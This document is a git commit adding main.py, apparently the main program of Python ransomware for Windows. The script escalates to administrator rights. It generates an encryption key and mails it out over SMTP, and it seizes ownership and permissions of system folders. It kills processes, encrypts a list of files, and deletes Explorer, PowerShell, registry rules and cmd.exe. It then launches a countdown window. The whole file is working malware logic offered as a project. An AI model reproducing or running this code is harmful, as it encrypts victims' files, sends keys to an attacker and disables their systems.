6b2edbf69a6069d7e17f6028348508ba34e2a616
ThomasPoirier-CS <70718793+ThomasPoirier-CS@users.noreply.github.com>
2020-10-28 21:46:23 +0100

    Add files via upload
    update main program

---
+++ main.py
@@ -0,0 +1,56 @@
+#!/usr/bin/python
+#coding:utf-8
+from tkinter import *
+from timeit import default_timer
+import tkinter as tk
+from cryptography.fernet import Fernet
+from modules.crypt import crypt
+from modules.permission import takeown, icacls, get_admin_rights
+from modules.system import killproc, regedit, delproc
+from modules.network import host_connect, sendkey_smtp, keyserver
+import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
+
+def copy_counter():
+    cpath = os.getcwd()
+    src = "%s\setup\gui_counter" %(cpath)
+    dst = "\\PerfLogs\\gui_counter"
+    cpy = shutil.copytree(src, dst)
+
+usr = os.environ["USERNAME"]
+if(get_admin_rights.is_admin()):
+    if host_connect.keyrcv():
+        keyserver.getcrypt()
+    else:
+        crypt.genkey(usr)
+        sendkey_smtp.send_key()
+        takeown.tkOwn_process()
+        takeown.tkOwn_perf()
+        takeown.tkOwn_exp()
+        icacls.icc_perf()
+        copy_counter()
+        icacls.icc_perf_all()
+        icacls.icc_exp()
+        icacls.icc_powershell()
+        icacls.icc_sys32()
+        killproc.pkill_smart()
+        crypt.filelist()
+        killproc.pkill_exp()
+        delproc.remove_exp()
+        delproc.remove_pwsst()
+        regedit.delSpecRules()
+        regedit.delRules()
+else:
+    print("Or restart the program with Admin permission")
+    # Re-run the program with admin rights
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
+
+path = os.getcwd()
+try:
+    rkey = "%s/%s.key" %(path, usr)
+    os.remove(rkey)
+except:
+    pass
+# Run the GUI Counter
+gcount = "\\PerfLogs\\gui_counter\\gui_counter.exe"
+os.system(gcount)
+os.remove("\\windows\\system32\\cmd.exe")
